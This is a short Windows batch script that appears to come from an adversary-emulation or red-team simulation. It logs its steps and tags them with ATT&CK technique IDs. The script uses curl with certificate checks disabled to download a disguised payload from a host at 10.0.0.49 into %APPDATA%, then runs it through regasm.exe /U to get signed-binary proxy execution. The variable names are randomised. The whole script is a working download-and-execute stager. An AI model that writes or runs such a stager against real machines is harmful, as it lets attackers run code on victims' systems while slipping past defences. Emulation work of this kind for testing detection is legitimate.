@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM ===== PHR_ placeholder variable assignments (random 6-8 char names) =====
SET akjdhm=%APPDATA%\10425\6056f1f3
SET qwzxpl=cc2df559.txt
SET mnbvfg=https://10.0.0.49/stage/2/icon.png?10425-7
SET plkmjv=ITZEL-S2BO
SET vbnmcx=10425
SET ghzxpq=7

REM ===== Initialize log file path and timestamp cache =====
SET logvar=%APPDATA%\!ghzxpq!\macula-simulations.log
SET tsvar=!DATE!/!TIME!

REM ===== Stage 2: Linear operations (no loops or opaque predicates) =====

REM Step 1: Heartbeat fetch via curl
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_start>> "!logvar!" 2>nul
curl -k -s -o "!akjdhm!\!qwzxpl!" "!mnbvfg!"
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_complete>> "!logvar!" 2>nul

REM Step 2: Change to output directory
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: chdir_start>> "!logvar!" 2>nul
cd /d "!akjdhm!" >nul 2>&1
SET chdir_ec=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: chdir_result=!chdir_ec!>> "!logvar!" 2>nul

REM Step 3: LOLBIN invocation via regasm.exe /U
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: regasm_invocation>> "!logvar!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U "!qwzxpl!" >NUL 2>&1
SET regasm_ec=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: regasm_result=!regasm_ec!>> "!logvar!" 2>nul
if !regasm_ec! EQU 0 (
    echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logvar!" 2>nul
) else (
    echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1218|System Binary Proxy Execution=[FAIL]:[regasm_failed]>> "!logvar!" 2>nul
)

REM Step 4: Log obfuscation technique (T1027) – obfuscation applied statically in the DLL, not in this BAT
echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1027|Obfuscated Files or Information=[OK]:[]>> "!logvar!" 2>nul

REM ===== Clean exit =====
exit /b 0